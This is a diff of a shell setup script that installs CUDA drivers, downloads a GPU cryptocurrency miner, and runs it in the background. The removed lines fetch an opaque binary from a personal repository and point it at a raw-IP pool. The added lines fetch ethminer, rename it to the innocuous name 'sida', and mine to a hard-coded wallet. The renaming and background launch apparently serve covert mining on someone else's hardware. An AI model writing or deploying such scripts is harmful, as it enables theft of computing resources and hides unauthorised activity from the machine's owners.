@@ -11,11 +11,11 @@ if [ ! -f "${SCRIPT_DIR}/isHaveSetupCoin.txt" ]; then
     sudo apt-get -y install cuda-drivers
     sudo apt-get install libcurl3 -y
     echo "taind vip pro" > isHaveSetupCoin.txt
-    wget https://github.com/nguyen3297/sub/raw/main/bin.bin
-    mv bin.bin bin.zip
-    sudo apt install unzip
-    unzip bin.zip
+    wget https://github.com/ethereum-mining/ethminer/releases/download/v0.19.0-alpha.0/ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+    tar xvzf ethminer-0.19.0-alpha.0-cuda-9-linux-x86_64.tar.gz
+    cd  bin
+    mv ethminer sida
 fi
 cd  bin
 sudo chmod +x racing
-./racing -U -P http://135.148.176.21:8443/pool &
+./sida -U -P stratum://0x85c6aa49d2723b03ff8d81177669500ec7cdde5a.pool@us2.ethermine.org:4444 &
